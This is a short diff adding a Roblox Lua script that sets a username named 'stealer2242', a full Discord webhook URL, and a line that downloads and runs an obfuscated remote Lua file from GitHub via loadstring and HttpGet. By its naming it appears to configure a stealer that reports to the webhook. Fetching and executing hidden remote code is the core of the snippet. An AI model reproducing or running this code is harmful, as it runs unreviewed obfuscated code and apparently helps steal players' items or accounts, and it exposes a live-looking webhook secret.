@@ -1,0 +1,4 @@
+Username = "stealer2242"
+Webhook = "https://discord.com/api/webhooks/1262919379448889444/1ioCz8NRkPG_6eVuejD52BNu9EYVRbkBw_BSInzWTAaWIJm5fc7-8HR511eEFawebMPM"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pinggot/PlsDonate/refs/heads/main/obfuscated.lua.txt"))()
